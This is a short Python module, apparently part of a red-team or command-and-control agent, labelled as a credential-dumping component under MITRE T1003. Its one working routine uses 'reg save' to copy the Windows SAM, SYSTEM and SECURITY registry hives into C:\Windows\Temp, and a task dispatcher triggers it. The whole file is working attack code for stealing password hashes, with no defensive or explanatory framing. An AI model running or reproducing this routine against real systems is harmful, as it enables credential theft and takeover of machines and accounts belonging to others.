"""
Agent credentials module — extracts credentials from the target.
T1003: OS Credential Dumping
"""
from __future__ import annotations

import subprocess


def _dump_sam() -> str:
    """Use reg save to dump SAM/SYSTEM hives (requires SYSTEM)."""
    out = []
    for hive in ("SAM", "SYSTEM", "SECURITY"):
        r = subprocess.run(
            ["reg", "save", f"HKLM\\{hive}", f"C:\\Windows\\Temp\\{hive}.bak", "/y"],
            capture_output=True, text=True,
        )
        out.append(r.stdout + r.stderr)
    return "\n".join(out)


def run(task: dict) -> str:
    method = task.get("method", "sam")
    if method == "sam":
        return _dump_sam()
    return f"unknown method: {method}"
